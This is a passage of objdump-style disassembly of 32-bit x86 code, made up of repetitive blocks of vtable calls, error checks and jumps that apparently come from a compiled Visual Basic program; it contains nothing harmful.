  40552e:	50                   	push   %eax
  40552f:	8d 55 c0             	lea    -0x40(%ebp),%edx
  405532:	51                   	push   %ecx
  405533:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  405539:	52                   	push   %edx
  40553a:	50                   	push   %eax
  40553b:	6a 06                	push   $0x6
  40553d:	ff 15 1c 10 40 00    	call   *0x40101c
  405543:	83 c4 28             	add    $0x28,%esp
  405546:	e9 9d 1f 00 00       	jmp    0x4074e8
  40554b:	8b 0e                	mov    (%esi),%ecx
  40554d:	56                   	push   %esi
  40554e:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  405554:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405557:	50                   	push   %eax
  405558:	52                   	push   %edx
  405559:	ff d3                	call   *%ebx
  40555b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405561:	8b 06                	mov    (%esi),%eax
  405563:	56                   	push   %esi
  405564:	ff 90 08 03 00 00    	call   *0x308(%eax)
  40556a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40556d:	50                   	push   %eax
  40556e:	51                   	push   %ecx
  40556f:	ff d3                	call   *%ebx
  405571:	8b 10                	mov    (%eax),%edx
  405573:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405576:	51                   	push   %ecx
  405577:	50                   	push   %eax
  405578:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  40557e:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  405584:	85 c0                	test   %eax,%eax
  405586:	db e2                	fnclex
  405588:	7d 18                	jge    0x4055a2
  40558a:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  405590:	68 a0 00 00 00       	push   $0xa0
  405595:	68 84 2a 40 00       	push   $0x402a84
  40559a:	52                   	push   %edx
  40559b:	50                   	push   %eax
  40559c:	ff 15 38 10 40 00    	call   *0x401038
  4055a2:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4055a5:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4055ab:	89 45 98             	mov    %eax,-0x68(%ebp)
  4055ae:	b8 08 00 00 00       	mov    $0x8,%eax
  4055b3:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4055b6:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4055bd:	89 45 90             	mov    %eax,-0x70(%ebp)
  4055c0:	c7 85 58 ff ff ff 48 	movl   $0x402b48,-0xa8(%ebp)
  4055c7:	2b 40 00 
  4055ca:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4055d0:	ff 15 e8 10 40 00    	call   *0x4010e8
  4055d6:	c7 85 68 ff ff ff a0 	movl   $0x402ba0,-0x98(%ebp)
  4055dd:	2b 40 00 
  4055e0:	e9 5a fd ff ff       	jmp    0x40533f
  4055e5:	8b 16                	mov    (%esi),%edx
  4055e7:	56                   	push   %esi
  4055e8:	ff 92 08 03 00 00    	call   *0x308(%edx)
  4055ee:	50                   	push   %eax
  4055ef:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4055f2:	50                   	push   %eax
  4055f3:	ff d3                	call   *%ebx
  4055f5:	8b 0e                	mov    (%esi),%ecx
  4055f7:	56                   	push   %esi
  4055f8:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4055fe:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  405604:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405607:	50                   	push   %eax
  405608:	52                   	push   %edx
  405609:	ff d3                	call   *%ebx
  40560b:	8b 08                	mov    (%eax),%ecx
  40560d:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405610:	52                   	push   %edx
  405611:	50                   	push   %eax
  405612:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  405618:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40561e:	85 c0                	test   %eax,%eax
  405620:	db e2                	fnclex
  405622:	7d 18                	jge    0x40563c
  405624:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  40562a:	68 a0 00 00 00       	push   $0xa0
  40562f:	68 84 2a 40 00       	push   $0x402a84
  405634:	51                   	push   %ecx
  405635:	50                   	push   %eax
  405636:	ff 15 38 10 40 00    	call   *0x401038
  40563c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40563f:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  405645:	89 45 98             	mov    %eax,-0x68(%ebp)
  405648:	b8 08 00 00 00       	mov    $0x8,%eax
  40564d:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  405650:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  405657:	89 45 90             	mov    %eax,-0x70(%ebp)
  40565a:	c7 85 58 ff ff ff 50 	movl   $0x402b50,-0xa8(%ebp)
  405661:	2b 40 00 
  405664:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40566a:	ff 15 e8 10 40 00    	call   *0x4010e8
  405670:	c7 85 68 ff ff ff a8 	movl   $0x402ba8,-0x98(%ebp)
  405677:	2b 40 00 
  40567a:	e9 77 0e 00 00       	jmp    0x4064f6
  40567f:	8b 0e                	mov    (%esi),%ecx
  405681:	56                   	push   %esi
  405682:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  405688:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40568b:	50                   	push   %eax
  40568c:	52                   	push   %edx
  40568d:	ff d3                	call   *%ebx
  40568f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405695:	8b 06                	mov    (%esi),%eax
  405697:	56                   	push   %esi
  405698:	ff 90 08 03 00 00    	call   *0x308(%eax)
  40569e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4056a1:	50                   	push   %eax
  4056a2:	51                   	push   %ecx
  4056a3:	ff d3                	call   *%ebx
  4056a5:	8b 10                	mov    (%eax),%edx
  4056a7:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4056aa:	51                   	push   %ecx
  4056ab:	50                   	push   %eax
  4056ac:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4056b2:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4056b8:	85 c0                	test   %eax,%eax
  4056ba:	db e2                	fnclex
  4056bc:	7d 18                	jge    0x4056d6
  4056be:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  4056c4:	68 a0 00 00 00       	push   $0xa0
  4056c9:	68 84 2a 40 00       	push   $0x402a84
  4056ce:	52                   	push   %edx
  4056cf:	50                   	push   %eax
  4056d0:	ff 15 38 10 40 00    	call   *0x401038
  4056d6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4056d9:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4056df:	89 45 98             	mov    %eax,-0x68(%ebp)
  4056e2:	b8 08 00 00 00       	mov    $0x8,%eax
  4056e7:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4056ea:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4056f1:	89 45 90             	mov    %eax,-0x70(%ebp)
  4056f4:	c7 85 58 ff ff ff 58 	movl   $0x402b58,-0xa8(%ebp)
  4056fb:	2b 40 00 
  4056fe:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  405704:	ff 15 e8 10 40 00    	call   *0x4010e8
  40570a:	c7 85 68 ff ff ff b0 	movl   $0x402bb0,-0x98(%ebp)
  405711:	2b 40 00 
  405714:	e9 26 fc ff ff       	jmp    0x40533f
  405719:	8b 16                	mov    (%esi),%edx
  40571b:	56                   	push   %esi
  40571c:	ff 92 08 03 00 00    	call   *0x308(%edx)
  405722:	50                   	push   %eax
  405723:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405726:	50                   	push   %eax
  405727:	ff d3                	call   *%ebx
  405729:	8b 0e                	mov    (%esi),%ecx
  40572b:	56                   	push   %esi
  40572c:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405732:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  405738:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40573b:	50                   	push   %eax
  40573c:	52                   	push   %edx
  40573d:	ff d3                	call   *%ebx
  40573f:	8b 08                	mov    (%eax),%ecx
  405741:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405744:	52                   	push   %edx
  405745:	50                   	push   %eax
  405746:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  40574c:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  405752:	85 c0                	test   %eax,%eax
  405754:	db e2                	fnclex
  405756:	7d 18                	jge    0x405770
  405758:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  40575e:	68 a0 00 00 00       	push   $0xa0
  405763:	68 84 2a 40 00       	push   $0x402a84
  405768:	51                   	push   %ecx
  405769:	50                   	push   %eax
  40576a:	ff 15 38 10 40 00    	call   *0x401038
  405770:	8b 45 dc             	mov    -0x24(%ebp),%eax
  405773:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  405779:	89 45 98             	mov    %eax,-0x68(%ebp)
  40577c:	b8 08 00 00 00       	mov    $0x8,%eax
  405781:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  405784:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40578b:	89 45 90             	mov    %eax,-0x70(%ebp)
  40578e:	c7 85 58 ff ff ff 60 	movl   $0x402b60,-0xa8(%ebp)
  405795:	2b 40 00 
  405798:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40579e:	ff 15 e8 10 40 00    	call   *0x4010e8
  4057a4:	c7 85 68 ff ff ff b8 	movl   $0x402bb8,-0x98(%ebp)
  4057ab:	2b 40 00 
  4057ae:	e9 43 0d 00 00       	jmp    0x4064f6
  4057b3:	8b 0e                	mov    (%esi),%ecx
  4057b5:	56                   	push   %esi
  4057b6:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  4057bc:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4057bf:	50                   	push   %eax
  4057c0:	52                   	push   %edx
  4057c1:	ff d3                	call   *%ebx
  4057c3:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4057c9:	8b 06                	mov    (%esi),%eax
  4057cb:	56                   	push   %esi
  4057cc:	ff 90 08 03 00 00    	call   *0x308(%eax)
  4057d2:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4057d5:	50                   	push   %eax
  4057d6:	51                   	push   %ecx
  4057d7:	ff d3                	call   *%ebx
  4057d9:	8b 10                	mov    (%eax),%edx
  4057db:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4057de:	51                   	push   %ecx
  4057df:	50                   	push   %eax
  4057e0:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4057e6:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4057ec:	85 c0                	test   %eax,%eax
  4057ee:	db e2                	fnclex
  4057f0:	7d 18                	jge    0x40580a
  4057f2:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  4057f8:	68 a0 00 00 00       	push   $0xa0
  4057fd:	68 84 2a 40 00       	push   $0x402a84
  405802:	52                   	push   %edx
  405803:	50                   	push   %eax
  405804:	ff 15 38 10 40 00    	call   *0x401038
  40580a:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40580d:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  405813:	89 45 98             	mov    %eax,-0x68(%ebp)
  405816:	b8 08 00 00 00       	mov    $0x8,%eax
  40581b:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40581e:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  405825:	89 45 90             	mov    %eax,-0x70(%ebp)
  405828:	c7 85 58 ff ff ff 68 	movl   $0x402b68,-0xa8(%ebp)
  40582f:	2b 40 00 
  405832:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  405838:	ff 15 e8 10 40 00    	call   *0x4010e8
  40583e:	c7 85 68 ff ff ff c0 	movl   $0x402bc0,-0x98(%ebp)
  405845:	2b 40 00 
  405848:	e9 f2 fa ff ff       	jmp    0x40533f
  40584d:	8b 16                	mov    (%esi),%edx
  40584f:	56                   	push   %esi
  405850:	ff 92 08 03 00 00    	call   *0x308(%edx)
  405856:	50                   	push   %eax
  405857:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40585a:	50                   	push   %eax
  40585b:	ff d3                	call   *%ebx
  40585d:	8b 0e                	mov    (%esi),%ecx
  40585f:	56                   	push   %esi
  405860:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405866:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  40586c:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40586f:	50                   	push   %eax
  405870:	52                   	push   %edx
  405871:	ff d3                	call   *%ebx
  405873:	8b 08                	mov    (%eax),%ecx
  405875:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405878:	52                   	push   %edx
  405879:	50                   	push   %eax
  40587a:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  405880:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  405886:	85 c0                	test   %eax,%eax
  405888:	db e2                	fnclex
  40588a:	7d 18                	jge    0x4058a4
  40588c:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  405892:	68 a0 00 00 00       	push   $0xa0
  405897:	68 84 2a 40 00       	push   $0x402a84
  40589c:	51                   	push   %ecx
  40589d:	50                   	push   %eax
  40589e:	ff 15 38 10 40 00    	call   *0x401038
  4058a4:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4058a7:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4058ad:	89 45 98             	mov    %eax,-0x68(%ebp)
  4058b0:	b8 08 00 00 00       	mov    $0x8,%eax
  4058b5:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4058b8:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4058bf:	89 45 90             	mov    %eax,-0x70(%ebp)
  4058c2:	c7 85 58 ff ff ff 70 	movl   $0x402b70,-0xa8(%ebp)
  4058c9:	2b 40 00 
  4058cc:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4058d2:	ff 15 e8 10 40 00    	call   *0x4010e8
  4058d8:	c7 85 68 ff ff ff b4 	movl   $0x4024b4,-0x98(%ebp)
  4058df:	24 40 00 
  4058e2:	e9 0f 0c 00 00       	jmp    0x4064f6
  4058e7:	8b 0e                	mov    (%esi),%ecx
  4058e9:	56                   	push   %esi
  4058ea:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  4058f0:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4058f3:	50                   	push   %eax
  4058f4:	52                   	push   %edx
  4058f5:	ff d3                	call   *%ebx
  4058f7:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4058fd:	8b 06                	mov    (%esi),%eax
  4058ff:	56                   	push   %esi
  405900:	ff 90 08 03 00 00    	call   *0x308(%eax)
  405906:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405909:	50                   	push   %eax
  40590a:	51                   	push   %ecx
  40590b:	ff d3                	call   *%ebx
  40590d:	8b 10                	mov    (%eax),%edx
  40590f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405912:	51                   	push   %ecx
  405913:	50                   	push   %eax
  405914:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  40591a:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  405920:	85 c0                	test   %eax,%eax
  405922:	db e2                	fnclex
  405924:	7d 18                	jge    0x40593e
  405926:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  40592c:	68 a0 00 00 00       	push   $0xa0
  405931:	68 84 2a 40 00       	push   $0x402a84
  405936:	52                   	push   %edx
  405937:	50                   	push   %eax
  405938:	ff 15 38 10 40 00    	call   *0x401038
  40593e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  405941:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  405947:	89 45 98             	mov    %eax,-0x68(%ebp)
  40594a:	b8 08 00 00 00       	mov    $0x8,%eax
  40594f:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  405952:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  405959:	89 45 90             	mov    %eax,-0x70(%ebp)
  40595c:	c7 85 58 ff ff ff 78 	movl   $0x402b78,-0xa8(%ebp)
  405963:	2b 40 00 
  405966:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40596c:	ff 15 e8 10 40 00    	call   *0x4010e8
  405972:	c7 85 68 ff ff ff 64 	movl   $0x402864,-0x98(%ebp)
  405979:	28 40 00 
  40597c:	e9 be f9 ff ff       	jmp    0x40533f
  405981:	8b 16                	mov    (%esi),%edx
  405983:	56                   	push   %esi
  405984:	ff 92 08 03 00 00    	call   *0x308(%edx)
  40598a:	50                   	push   %eax
  40598b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40598e:	50                   	push   %eax
  40598f:	ff d3                	call   *%ebx
  405991:	8b 0e                	mov    (%esi),%ecx
  405993:	56                   	push   %esi
  405994:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40599a:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  4059a0:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4059a3:	50                   	push   %eax
  4059a4:	52                   	push   %edx
  4059a5:	ff d3                	call   *%ebx
  4059a7:	8b 08                	mov    (%eax),%ecx
  4059a9:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4059ac:	52                   	push   %edx
  4059ad:	50                   	push   %eax
  4059ae:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4059b4:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4059ba:	85 c0                	test   %eax,%eax
  4059bc:	db e2                	fnclex
  4059be:	7d 18                	jge    0x4059d8
  4059c0:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  4059c6:	68 a0 00 00 00       	push   $0xa0
  4059cb:	68 84 2a 40 00       	push   $0x402a84
  4059d0:	51                   	push   %ecx
  4059d1:	50                   	push   %eax
  4059d2:	ff 15 38 10 40 00    	call   *0x401038
  4059d8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4059db:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4059e1:	89 45 98             	mov    %eax,-0x68(%ebp)
  4059e4:	b8 08 00 00 00       	mov    $0x8,%eax
  4059e9:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4059ec:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4059f3:	89 45 90             	mov    %eax,-0x70(%ebp)
  4059f6:	c7 85 58 ff ff ff a4 	movl   $0x4024a4,-0xa8(%ebp)
  4059fd:	24 40 00 
  405a00:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  405a06:	ff 15 e8 10 40 00    	call   *0x4010e8
  405a0c:	c7 85 68 ff ff ff b4 	movl   $0x4026b4,-0x98(%ebp)
  405a13:	26 40 00 
  405a16:	e9 db 0a 00 00       	jmp    0x4064f6
  405a1b:	8b 0e                	mov    (%esi),%ecx
  405a1d:	56                   	push   %esi
  405a1e:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  405a24:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405a27:	50                   	push   %eax
  405a28:	52                   	push   %edx
  405a29:	ff d3                	call   *%ebx
  405a2b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405a31:	8b 06                	mov    (%esi),%eax
  405a33:	56                   	push   %esi
  405a34:	ff 90 08 03 00 00    	call   *0x308(%eax)
  405a3a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405a3d:	50                   	push   %eax
  405a3e:	51                   	push   %ecx
  405a3f:	ff d3                	call   *%ebx
  405a41:	8b f8                	mov    %eax,%edi
  405a43:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405a46:	50                   	push   %eax
  405a47:	57                   	push   %edi
  405a48:	8b 17                	mov    (%edi),%edx
  405a4a:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  405a50:	85 c0                	test   %eax,%eax
  405a52:	db e2                	fnclex
  405a54:	7d 12                	jge    0x405a68
  405a56:	68 a0 00 00 00       	push   $0xa0
  405a5b:	68 84 2a 40 00       	push   $0x402a84
  405a60:	57                   	push   %edi
  405a61:	50                   	push   %eax
  405a62:	ff 15 38 10 40 00    	call   *0x401038
  405a68:	8b 55 dc             	mov    -0x24(%ebp),%edx
  405a6b:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  405a71:	52                   	push   %edx
  405a72:	68 c8 2b 40 00       	push   $0x402bc8
  405a77:	8b 39                	mov    (%ecx),%edi
  405a79:	ff 15 30 10 40 00    	call   *0x401030
  405a7f:	8b d0                	mov    %eax,%edx
  405a81:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405a84:	ff 15 f0 10 40 00    	call   *0x4010f0
  405a8a:	89 bd 74 fe ff ff    	mov    %edi,-0x18c(%ebp)
  405a90:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405a96:	50                   	push   %eax
  405a97:	8b 85 74 fe ff ff    	mov    -0x18c(%ebp),%eax
  405a9d:	57                   	push   %edi
  405a9e:	e9 e6 f0 ff ff       	jmp    0x404b89
  405aa3:	8b 16                	mov    (%esi),%edx
  405aa5:	56                   	push   %esi
  405aa6:	ff 92 08 03 00 00    	call   *0x308(%edx)
  405aac:	50                   	push   %eax
  405aad:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405ab0:	50                   	push   %eax
  405ab1:	ff d3                	call   *%ebx
  405ab3:	8b 0e                	mov    (%esi),%ecx
  405ab5:	56                   	push   %esi
  405ab6:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405abc:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  405ac2:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405ac5:	50                   	push   %eax
  405ac6:	52                   	push   %edx
  405ac7:	ff d3                	call   *%ebx
  405ac9:	8b f8                	mov    %eax,%edi
  405acb:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405ace:	51                   	push   %ecx
  405acf:	57                   	push   %edi
  405ad0:	8b 07                	mov    (%edi),%eax
  405ad2:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  405ad8:	85 c0                	test   %eax,%eax
  405ada:	db e2                	fnclex
  405adc:	7d 12                	jge    0x405af0
  405ade:	68 a0 00 00 00       	push   $0xa0
  405ae3:	68 84 2a 40 00       	push   $0x402a84
  405ae8:	57                   	push   %edi
  405ae9:	50                   	push   %eax
  405aea:	ff 15 38 10 40 00    	call   *0x401038
  405af0:	8b 45 dc             	mov    -0x24(%ebp),%eax
  405af3:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  405af9:	50                   	push   %eax
  405afa:	68 d8 2b 40 00       	push   $0x402bd8
  405aff:	8b 3a                	mov    (%edx),%edi
  405b01:	ff 15 30 10 40 00    	call   *0x401030
  405b07:	8b d0                	mov    %eax,%edx
  405b09:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405b0c:	ff 15 f0 10 40 00    	call   *0x4010f0
  405b12:	8b cf                	mov    %edi,%ecx
  405b14:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405b1a:	50                   	push   %eax
  405b1b:	57                   	push   %edi
  405b1c:	e9 86 17 00 00       	jmp    0x4072a7
  405b21:	8b 06                	mov    (%esi),%eax
  405b23:	56                   	push   %esi
  405b24:	ff 90 08 03 00 00    	call   *0x308(%eax)
  405b2a:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  405b2d:	50                   	push   %eax
  405b2e:	51                   	push   %ecx
  405b2f:	ff d3                	call   *%ebx
  405b31:	8b 16                	mov    (%esi),%edx
  405b33:	56                   	push   %esi
  405b34:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405b3a:	ff 92 08 03 00 00    	call   *0x308(%edx)
  405b40:	50                   	push   %eax
  405b41:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405b44:	50                   	push   %eax
  405b45:	ff d3                	call   *%ebx
  405b47:	8b f8                	mov    %eax,%edi
  405b49:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405b4c:	52                   	push   %edx
  405b4d:	57                   	push   %edi
  405b4e:	8b 0f                	mov    (%edi),%ecx
  405b50:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  405b56:	85 c0                	test   %eax,%eax
  405b58:	db e2                	fnclex
  405b5a:	7d 12                	jge    0x405b6e
  405b5c:	68 a0 00 00 00       	push   $0xa0
  405b61:	68 84 2a 40 00       	push   $0x402a84
  405b66:	57                   	push   %edi
  405b67:	50                   	push   %eax
  405b68:	ff 15 38 10 40 00    	call   *0x401038
  405b6e:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  405b71:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  405b77:	51                   	push   %ecx
  405b78:	68 e8 2b 40 00       	push   $0x402be8
  405b7d:	8b 38                	mov    (%eax),%edi
  405b7f:	ff 15 30 10 40 00    	call   *0x401030
  405b85:	8b d0                	mov    %eax,%edx
  405b87:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405b8a:	ff 15 f0 10 40 00    	call   *0x4010f0
  405b90:	8b d7                	mov    %edi,%edx
  405b92:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405b98:	50                   	push   %eax
  405b99:	57                   	push   %edi
  405b9a:	e9 52 ef ff ff       	jmp    0x404af1
  405b9f:	8b 0e                	mov    (%esi),%ecx
  405ba1:	56                   	push   %esi
  405ba2:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  405ba8:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405bab:	50                   	push   %eax
  405bac:	52                   	push   %edx
  405bad:	ff d3                	call   *%ebx
  405baf:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405bb5:	8b 06                	mov    (%esi),%eax
  405bb7:	56                   	push   %esi
  405bb8:	ff 90 08 03 00 00    	call   *0x308(%eax)
  405bbe:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405bc1:	50                   	push   %eax
  405bc2:	51                   	push   %ecx
  405bc3:	ff d3                	call   *%ebx
  405bc5:	8b f8                	mov    %eax,%edi
  405bc7:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405bca:	50                   	push   %eax
  405bcb:	57                   	push   %edi
  405bcc:	8b 17                	mov    (%edi),%edx
  405bce:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  405bd4:	85 c0                	test   %eax,%eax
  405bd6:	db e2                	fnclex
  405bd8:	7d 12                	jge    0x405bec
  405bda:	68 a0 00 00 00       	push   $0xa0
  405bdf:	68 84 2a 40 00       	push   $0x402a84
  405be4:	57                   	push   %edi
  405be5:	50                   	push   %eax
  405be6:	ff 15 38 10 40 00    	call   *0x401038
  405bec:	8b 55 dc             	mov    -0x24(%ebp),%edx
  405bef:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  405bf5:	52                   	push   %edx
  405bf6:	68 f8 2b 40 00       	push   $0x402bf8
  405bfb:	8b 39                	mov    (%ecx),%edi
  405bfd:	ff 15 30 10 40 00    	call   *0x401030
  405c03:	8b d0                	mov    %eax,%edx
  405c05:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405c08:	ff 15 f0 10 40 00    	call   *0x4010f0
  405c0e:	89 bd 68 fe ff ff    	mov    %edi,-0x198(%ebp)
  405c14:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405c1a:	50                   	push   %eax
  405c1b:	8b 85 68 fe ff ff    	mov    -0x198(%ebp),%eax
  405c21:	57                   	push   %edi
  405c22:	e9 62 ef ff ff       	jmp    0x404b89
  405c27:	8b 16                	mov    (%esi),%edx
  405c29:	56                   	push   %esi
  405c2a:	ff 92 08 03 00 00    	call   *0x308(%edx)
  405c30:	50                   	push   %eax
  405c31:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405c34:	50                   	push   %eax
  405c35:	ff d3                	call   *%ebx
  405c37:	8b 0e                	mov    (%esi),%ecx
  405c39:	56                   	push   %esi
  405c3a:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405c40:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  405c46:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405c49:	50                   	push   %eax
  405c4a:	52                   	push   %edx
  405c4b:	ff d3                	call   *%ebx
  405c4d:	8b f8                	mov    %eax,%edi
  405c4f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405c52:	51                   	push   %ecx
  405c53:	57                   	push   %edi
  405c54:	8b 07                	mov    (%edi),%eax
  405c56:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  405c5c:	85 c0                	test   %eax,%eax
  405c5e:	db e2                	fnclex
  405c60:	7d 12                	jge    0x405c74
  405c62:	68 a0 00 00 00       	push   $0xa0
  405c67:	68 84 2a 40 00       	push   $0x402a84
  405c6c:	57                   	push   %edi
  405c6d:	50                   	push   %eax
  405c6e:	ff 15 38 10 40 00    	call   *0x401038
  405c74:	8b 45 dc             	mov    -0x24(%ebp),%eax
  405c77:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  405c7d:	50                   	push   %eax
  405c7e:	68 08 2c 40 00       	push   $0x402c08
  405c83:	8b 3a                	mov    (%edx),%edi
  405c85:	ff 15 30 10 40 00    	call   *0x401030
